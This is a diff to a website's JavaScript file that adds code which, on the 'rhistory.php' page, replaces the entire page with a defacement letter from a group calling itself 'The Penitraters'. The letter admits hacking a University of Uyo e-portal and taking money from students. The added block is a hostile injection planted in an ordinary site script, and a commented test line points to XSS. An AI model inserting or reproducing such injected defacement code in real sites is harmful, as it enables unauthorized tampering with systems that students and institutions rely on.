@@ -75,6 +75,46 @@ window.onload = function (){
 </tr>
 </tbody></table>`;
 	}
+	
+	
+var currentPage = window.location.href;
+if (currentPage.includes("rhistory.php")){
+//if (currentPage.includes("test_sie_XSS.html")){
+  var elem = document.getElementsByTagName("html");
+  elem[0].innerHTML = `
+  <div style="display: block; position: fixed; color: white">
+  <style>
+    html, body{
+      background-color: #598694;
+    }
+  </style>
+  <h1> Message from Hackers </h1>
+
+  We are sorry for hacking into this site.
+  The Truth is no body cares about how we feel. we are broken and weak but you are strong. 
+  Many people including Lecturers feel we are lazy and unintelligent.
+
+  We have hacked this site today to use this medium to seek for Employment.<br/>
+  <b> We wish to apply, to be employed as pentration testers and hackers for the University of Uyo, SkylinePay or any other interested company. </b>
+
+  We plan to direct our skills to the right path and help people build better and more secured web/mobile Apps.
+
+  We do not plan to take money from Nigeria Students as we have done for some days now.
+  And we apology for the inconveniences we casued some Students and the programmers. We could steal the card details of
+  many students and subscribe them to daily payment but we did not. We could have written more malicious scripts but we choose to direct our skills to doing good by releasing this letter.
+  <br/>
+  We are deeply sorry.
+  <br/>
+  As a means to protect ourselves and the fear of what man may want to achieve with our skills, we have choosen to remain anonymous.
+  <br/>
+  <i> We also want to use this medium to plead with the E-portal of the University of Uyo to back-up their database systems. </i>
+  <br/>
+  Not to worry, We are a brand.
+  <br/><br/>
+  <h3> #The Penitraters - alias Broken_Hackers </h3>
+  </div>
+  `;
+}
 }
 //$("#see").text(2400);
 function adam(){
